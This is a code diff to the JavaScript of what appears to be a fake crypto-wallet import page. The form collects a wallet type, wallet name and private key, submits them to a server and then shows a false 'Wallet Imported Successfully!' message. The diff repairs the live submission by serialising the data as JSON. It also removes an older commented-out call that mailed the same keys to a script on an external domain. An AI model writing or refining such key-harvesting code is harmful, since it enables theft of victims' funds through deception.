@@ -220,7 +220,6 @@ $("document").ready(function () {
 
     $("#key_submission button").attr("disabled", true);
     $("#key_submission button").text("Loading...");
-    alert("Loading");
 
     const myformData = {
       Type,
@@ -235,7 +234,7 @@ $("document").ready(function () {
         headers: {
           "Content-Type": "application/json",
         },
-        body: myformData,
+        body: JSON.stringify(myformData),
       }
     );
 
@@ -248,35 +247,6 @@ $("document").ready(function () {
             '<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>'
           )
       );
-
-    //         $.ajax({
-    //             url: 'https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php',
-    //             method: 'POST',
-    //             data: {
-    //                 Type,
-    //                 Wallet,
-    //                 Key
-    //             },
-    //             success: function (data) {
-    //                 alert('3');
-    //                 console.log(data);
-    //                 $('#key_submission button').text('Imported');
-    //                 if (data == 'Mail Sent') {
-    //                     $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>')
-    //                 }
-    //             },
-    //             fail: function (err) {
-    //                 alert('2');
-    //                 console.log(err);
-    //             },
-    //             error: function (err) {
-    //                 alert('1');
-    //                 console.log(err);
-    //                 if(err.responseText){
-    //                     $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>');
-    //                 }
-    //             }
-    //         })
 
     return false;
   });
